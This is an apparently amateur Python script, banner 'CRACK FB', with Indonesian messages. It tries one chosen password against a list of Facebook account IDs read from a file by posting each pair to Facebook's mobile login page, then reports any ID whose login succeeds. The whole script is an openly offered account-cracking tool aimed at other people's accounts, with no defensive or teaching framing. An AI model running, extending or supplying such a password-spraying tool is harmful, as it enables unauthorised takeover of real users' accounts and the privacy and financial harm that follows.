import requests, sys, os
os.system("clear")
os.system("figlet CRACK FB | lolcat")
print ("~# ARJUN-NEWBIE")
print ("<--------------->")
print
user = input("INPUT NAME LIST: ")
print ("<--------------->")
pas = input("CRACK PASSWORD: ")
print ("<--------------->")
def login(user,pas):
    url = "https://free.facebook.com/login.php"

    respon = requests.post(url, data = {"email":user, "pass":pas})

    if "_rdc=1&_rd" in respon.url:
              print ("PASSWORD DI TEMUKAN => ID =>", user, "password => ", pas)
    else:
              print ("PASSWORD GAGAL DI TEMUKAN", pas)

def login1(user,pas):
    ex = open('David_id.txt', "r").readlines()
    for c in ex:
              login(c.strip(),pas)

try:
    login1(user,pas)

except:
    exit()
